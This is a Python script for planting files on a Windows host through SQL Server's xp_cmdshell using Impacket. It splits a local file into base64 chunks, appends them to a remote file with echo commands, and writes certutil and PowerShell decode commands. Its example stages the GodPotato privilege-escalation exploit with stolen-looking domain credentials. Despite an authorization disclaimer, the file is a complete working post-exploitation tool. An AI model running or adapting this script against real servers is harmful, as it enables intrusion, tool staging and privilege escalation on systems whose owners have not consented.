#!/usr/bin/env python3
"""
mssql-file-uploader.py
----------------------

Upload files to a Windows target using xp_cmdshell via Impacket’s mssqlclient.
This script base64-encodes a local file, sends it in small chunks, and generates
SQL/PowerShell helper files to decode the file on the remote host.

Author: Robert I. Dumitrescu
License: MIT

USAGE:
  python3 uploader_write_decode_cmds.py <host> <username> <password> <local_file> --target "C:\\Users\\Public" [options]

Example:
  python3 uploader_write_decode_cmds.py 10.10.205.148 "delta.com/sql_svc" Sapphire123 /home/kali/GodPotato-NET4.exe --target "C:\\Users\\Public" --windows-auth --chunk-size 1000 --retries 2

IMPORTANT:
  - Only run against systems you are explicitly authorized to test.
  - Requires Impacket MSSQL client available on PATH (impacket-mssqlclient or mssqlclient.py).
  - The SQL Server account must have xp_cmdshell enabled.
"""
from __future__ import annotations
import argparse
import base64
import os
import shutil
import subprocess
import sys
import tempfile
import time
from typing import Tuple, List

# Candidate names for the impacket MSSQL client CLI (common installs)
CLIENT_CANDIDATES = ["impacket-mssqlclient", "mssqlclient.py"]

# Default size of each Base64 chunk (characters). Tune down if you encounter length limits.
DEFAULT_CHUNK_SIZE = 1000


def find_impacket_client() -> str:
    """
    Return the command name of the first found Impacket MSSQL client on PATH.
    Raises RuntimeError if none found.
    """
    for name in CLIENT_CANDIDATES:
        if shutil.which(name):
            return name
    raise RuntimeError(f"None of {CLIENT_CANDIDATES} found on PATH. Install impacket and ensure client is runnable.")


def run_impacket_cmd(args_list: List[str], timeout: int = 120) -> subprocess.CompletedProcess:
    """
    Run subprocess with captured output. Returns CompletedProcess.
    """
    return subprocess.run(args_list, capture_output=True, text=True, timeout=timeout)


def run_mssql_command(host: str, username: str, password: str, sql_command: str,
                      timeout: int = 120, windows_auth: bool = False) -> str:
    """
    Execute SQL via Impacket MSSQL client.

    Strategy:
      1) Try -command (fast). If it fails or times out:
      2) Write SQL to a temporary .sql file and call client with -file (safer for long/complex SQL).

    Returns stdout of the impacket client on success. Raises RuntimeError on failure.
    """
    client = find_impacket_client()
    target = f"{username}:{password}@{host}"
    win_flag = ["-windows-auth"] if windows_auth else []

    # Attempt 1: -command (short mode)
    cmd_try = [client, target] + win_flag + ["-command", sql_command]
    try:
        proc = run_impacket_cmd(cmd_try, timeout=timeout)
    except subprocess.TimeoutExpired:
        raise RuntimeError(f"Timeout ({timeout}s) using -command.")

    if proc.returncode == 0:
        return proc.stdout

    # Fallback: write SQL to a temporary file, then call -file (handles quoting/length)
    with tempfile.NamedTemporaryFile("w", delete=False, suffix=".sql", encoding="utf-8") as tf:
        tmpname = tf.name
        tf.write(sql_command)
        if not sql_command.endswith("\n"):
            tf.write("\n")
    try:
        proc2 = run_impacket_cmd([client, target] + win_flag + ["-file", tmpname], timeout=max(timeout, 300))
    finally:
        try:
            os.unlink(tmpname)
        except Exception:
            pass

    if proc2.returncode != 0:
        raise RuntimeError(f"impacket failed (rc={proc2.returncode}). stdout:\n{proc2.stdout}\nstderr:\n{proc2.stderr}")
    return proc2.stdout


def encode_and_chunk(local_path: str, chunk_size: int = DEFAULT_CHUNK_SIZE) -> list[str]:
    """
    Read local file bytes, base64-encode as ASCII string, and split into chunk_size pieces.
    Returns list of base64 string chunks.
    """
    with open(local_path, "rb") as f:
        data = f.read()
    b64 = base64.b64encode(data).decode("ascii")
    return [b64[i:i + chunk_size] for i in range(0, len(b64), chunk_size)]


def build_echo_append_sql(chunk: str, remote_b64: str) -> str:
    """
    Create SQL statement which calls xp_cmdshell to execute:
      cmd /C "echo <chunk> >> <remote_b64>"
    We double single quotes to safely embed in SQL single-quoted literals.
    """
    safe_chunk = chunk.replace("'", "''")
    safe_path = remote_b64.replace("'", "''")
    return f"EXEC xp_cmdshell 'cmd /C \"echo {safe_chunk} >> {safe_path}\"';"


def derive_remote_paths(local_file: str, target_arg: str | None) -> Tuple[str, str]:
    """
    Determine remote .b64 and decoded file paths.

    If target_arg is None -> default to C:\Windows\Temp\<basename>.b64 and <basename>
    If target_arg looks like a directory (ends with slash or has no extension) -> treat as directory.
    If target_arg looks like a full path -> treat as decoded file path.
    """
    base = os.path.basename(local_file)
    if not target_arg:
        default_dir = r"C:\Windows\Temp"
        return fr"{default_dir}\{base}.b64", fr"{default_dir}\{base}"

    # if target is directory-like
    if target_arg.endswith("\\") or target_arg.endswith("/") or os.path.splitext(target_arg)[1] == "":
        dir_path = target_arg.rstrip("\\/")
        return fr"{dir_path}\{base}.b64", fr"{dir_path}\{base}"

    # target is full decoded path
    decoded = target_arg
    dir_path = os.path.dirname(decoded) or r"C:\Windows\Temp"
    fname = os.path.splitext(os.path.basename(decoded))[0]
    return fr"{dir_path}\{fname}.b64", decoded


def transfer_chunks(host: str, username: str, password: str, local_file: str,
                    remote_b64: str, chunk_size: int, retries: int,
                    windows_auth: bool, per_chunk_timeout: int):
    """
    Transfer the local file to the remote .b64 by sending chunks via xp_cmdshell echo append.

    Retries each chunk up to `retries` times on transient failures.
    """
    chunks = encode_and_chunk(local_file, chunk_size)
    total = len(chunks)
    print(f"[+] Encoded into {total} chunks (chunk_size={chunk_size}).")

    # Best-effort: remove existing remote file to avoid appending to stale content
    try:
        safe = remote_b64.replace("'", "''")
        rm_sql = (
            f"EXEC xp_cmdshell 'powershell -NoProfile -NonInteractive -Command "
            f"\"if (Test-Path -LiteralPath ''{safe}'' ) {{ Remove-Item -LiteralPath ''{safe}'' -Force }}\"';"
        )
        run_mssql_command(host, username, password, rm_sql, timeout=30, windows_auth=windows_auth)
    except Exception:
        # ignore failures here and proceed
        pass

    start = time.time()
    for idx, chunk in enumerate(chunks, start=1):
        attempt = 0
        while attempt <= retries:
            attempt += 1
            sys.stdout.write(f"\r[chunk {idx}/{total}] len={len(chunk)} attempt={attempt}/{retries+1} ... ")
            sys.stdout.flush()
            sql = build_echo_append_sql(chunk, remote_b64)
            try:
                # xp_cmdshell often returns NULL; success is determined by impacket exit code
                _ = run_mssql_command(host, username, password, sql, timeout=per_chunk_timeout, windows_auth=windows_auth)
                break
            except Exception as e:
                print(f"\n[!] chunk {idx} attempt {attempt} failed: {e}")
                if attempt <= retries:
                    time.sleep(0.7)
                    continue
                raise RuntimeError(f"Failed to append chunk {idx} after {retries} retries: {e}")
        elapsed = int(time.time() - start)
        pct = (idx / total) * 100
        sys.stdout.write(f"\r[{idx}/{total}] {pct:6.2f}% Elapsed {elapsed}s")
        sys.stdout.flush()
    print("\n[+] Transfer complete.")


# ------------------- helpers for decode files -------------------
def sql_safe_quote(s: str) -> str:
    """
    Double single quotes for safe SQL literal embedding.
    """
    return s.replace("'", "''")


def make_decode_variants(remote_b64: str, remote_bin: str, outdir: str) -> List[str]:
    """
    Writes helper files to 'outdir' and returns list of filenames.
    Files include SQL wrappers that call certutil or PowerShell, and plain text commands.
    """
    files = []
    os.makedirs(outdir, exist_ok=True)

    safe_b64 = sql_safe_quote(remote_b64)
    safe_bin = sql_safe_quote(remote_bin)

    # 1) certutil via xp_cmdshell (SQL one-liner)
    certutil_sql = f"EXEC xp_cmdshell 'cmd /C \"certutil -decode {remote_b64} {remote_bin}\"';\n"
    p = os.path.join(outdir, "decode_certutil.sql")
    with open(p, "w", encoding="utf-8") as f:
        f.write(certutil_sql)
    files.append(p)

    # 2) PowerShell via xp_cmdshell (SQL one-liner)
    ps = f"$b = Get-Content -Raw -LiteralPath '{safe_b64}'; [System.IO.File]::WriteAllBytes('{safe_bin}', [System.Convert]::FromBase64String($b));"
    ps_sql = f"EXEC xp_cmdshell 'powershell -NoProfile -NonInteractive -Command \"{ps}\"';\n"
    p2 = os.path.join(outdir, "decode_powershell_sql.sql")
    with open(p2, "w", encoding="utf-8") as f:
        f.write(ps_sql)
    files.append(p2)

    # 3) same PS variant for -file usage
    p3 = os.path.join(outdir, "decode_powershell_file.sql")
    with open(p3, "w", encoding="utf-8") as f:
        f.write(ps_sql)
    files.append(p3)

    # 4) certutil interactive command (for direct use on host)
    certutil_cmd = f'certutil -decode "{remote_b64}" "{remote_bin}"\n'
    p4 = os.path.join(outdir, "certutil_cmd.txt")
    with open(p4, "w", encoding="utf-8") as f:
        f.write(certutil_cmd)
    files.append(p4)

    # 5) PowerShell interactive command
    pwsh_cmd = f"$b = Get-Content -Raw -LiteralPath '{remote_b64}'; [System.IO.File]::WriteAllBytes('{remote_bin}', [System.Convert]::FromBase64String($b));"
    p5 = os.path.join(outdir, "powershell_cmd.txt")
    with open(p5, "w", encoding="utf-8") as f:
        f.write(pwsh_cmd + "\n")
    files.append(p5)

    # 6) hash examples (Get-FileHash + certutil)
    hash_sql = (
        f"EXEC xp_cmdshell 'powershell -NoProfile -Command \"(Get-FileHash -Algorithm SHA256 -LiteralPath ''{safe_bin}'' ).Hash\"';\n"
        f"EXEC xp_cmdshell 'cmd /C \"certutil -hashfile {remote_bin} SHA256\"';\n"
    )
    p6 = os.path.join(outdir, "gethash_sql.sql")
    with open(p6, "w", encoding="utf-8") as f:
        f.write(hash_sql)
    files.append(p6)

    return files


# -------------------- CLI --------------------
def main():
    parser = argparse.ArgumentParser(description="Upload file as base64 chunks and produce decode commands (.sql/.txt).")
    parser.add_argument("host", help="MSSQL server hostname or IP")
    parser.add_argument("username", help="username (domain\\user or user)")
    parser.add_argument("password", help="password")
    parser.add_argument("local_file", help="path to local file to upload")
    parser.add_argument("--target", "-t", help=r"remote dir or full path (e.g. C:\Users\Public or C:\Users\Public\file.exe)", default=None)
    parser.add_argument("--chunk-size", type=int, default=DEFAULT_CHUNK_SIZE, help="base64 characters per chunk")
    parser.add_argument("--retries", type=int, default=1, help="retries per chunk")
    parser.add_argument("--per-chunk-timeout", type=int, default=60, help="timeout for each impacket call (seconds)")
    parser.add_argument("--windows-auth", action="store_true", help="use Impacket windows-auth mode")
    parser.add_argument("--outdir", default="decode_commands", help="where to write .sql/.txt helpers")
    args = parser.parse_args()

    if not os.path.isfile(args.local_file):
        print(f"[!] local file not found: {args.local_file}")
        sys.exit(1)

    try:
        client = find_impacket_client()
    except RuntimeError as e:
        print(f"[!] {e}")
        sys.exit(1)
    print(f"[+] Using client: {client}")

    remote_b64, remote_bin = derive_remote_paths(args.local_file, args.target)
    print(f"[+] Remote .b64 path: {remote_b64}")
    print(f"[+] Remote decoded path (suggested): {remote_bin}")

    # Perform transfer
    try:
        transfer_chunks(args.host, args.username, args.password, args.local_file, remote_b64,
                        args.chunk_size, args.retries, args.windows_auth, args.per_chunk_timeout)
    except Exception as e:
        print(f"[!] Upload failed: {e}")
        sys.exit(2)

    # Generate helper decode files
    files = make_decode_variants(remote_b64, remote_bin, args.outdir)
    print("\n[+] Wrote helper decode files to:", os.path.abspath(args.outdir))
    for fname in files:
        print("    -", fname)

    # Print recommended commands / guidance
    print("\n[*] Recommended ways to decode on the target (pick one):\n")
    print("1) Use impacket client -file to run the SQL that calls certutil (recommended):")
    print(f"   impacket-mssqlclient \"{args.username}:{args.password}@{args.host}\" {'-windows-auth' if args.windows_auth else ''} -file {os.path.join(args.outdir, 'decode_certutil.sql')}")
    print("   OR run the PowerShell variant:")
    print(f"   impacket-mssqlclient \"{args.username}:{args.password}@{args.host}\" {'-windows-auth' if args.windows_auth else ''} -file {os.path.join(args.outdir, 'decode_powershell_file.sql')}")
    print()
    print("2) xp_cmdshell one-liner via -command (only for advanced users; careful quoting):")
    print(f"   impacket-mssqlclient \"{args.username}:{args.password}@{args.host}\" {'-windows-auth' if args.windows_auth else ''} -command \"EXEC xp_cmdshell 'cmd /C \\\"certutil -decode {remote_b64} {remote_bin}\\\"';\"")
    print()
    print("3) If you have interactive access on the host, decode directly with certutil or PowerShell:")
    print(f"   certutil -decode \"{remote_b64}\" \"{remote_bin}\"")
    print(f"   OR (PowerShell on target) $b = Get-Content -Raw -LiteralPath '{remote_b64}'; [System.IO.File]::WriteAllBytes('{remote_bin}', [System.Convert]::FromBase64String($b));")
    print()
    print("4) Verify hash after decode (examples in gethash_sql.sql).")
    print("\n[*] Note: If -command fails due to quoting or length, use the -file variants (safer).")
    print("[*] The uploaded .b64 remains on target at:", remote_b64)
    print("[+] Done.")
    sys.exit(0)


if __name__ == "__main__":
    main()
